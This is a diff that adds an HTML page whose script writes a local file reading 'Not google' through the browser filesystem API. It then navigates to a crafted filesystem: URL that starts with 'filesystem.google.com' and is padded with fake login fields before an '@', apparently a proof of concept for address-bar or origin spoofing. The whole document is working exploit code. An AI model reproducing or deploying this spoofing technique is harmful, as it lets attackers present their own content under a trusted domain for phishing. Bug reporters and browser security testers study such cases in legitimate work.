@@ -1,0 +1,34 @@
+<html>
+<head>
+<script>
+
+</script>
+</head>
+<body>
+
+<script>
+window.requestFileSystem  = window.requestFileSystem || window.webkitRequestFileSystem;
+function onInitFs(fs) {
+  fs.root.getFile("qq.html", {create: true}, fileEntry => {
+
+    fileEntry.createWriter(fileWriter=>{
+      
+      var blob = new Blob(["<b>Not google</b>"], {type : 'text/html'});
+      fileWriter.write(blob);
+    }, errorHandler);
+    
+  var url= fileEntry.toURL();
+  console.dir(url);
+  location="filesystem:http://filesystem.google.com:80&login&SGVsbG9UaGlzSXNKdXN0QUZpbGxlcklhbVNvcnJ5VG9EaXNzYXBwb2ludEJ1dEZlZWxGcmVlVG9JZ25vcmVUaGlzLUFsc28tSWFtTG9va2luZ0ZvcndhcmRUb1dlc3RXb3JsZA&login=0&secure=true&FILLERFILLERFILLERFILLERFILLERFILLERFILLERFILLERFILLERFILLERFILLERFILLER=123456@"+url.split("filesystem:http://")[1]
+  }, errorHandler);
+
+}
+
+function errorHandler(e) {
+  console.dir(e);
+}
+
+window.requestFileSystem(window.TEMPORARY, 1024, onInitFs, errorHandler);
+</script>
+</body>
+</html>
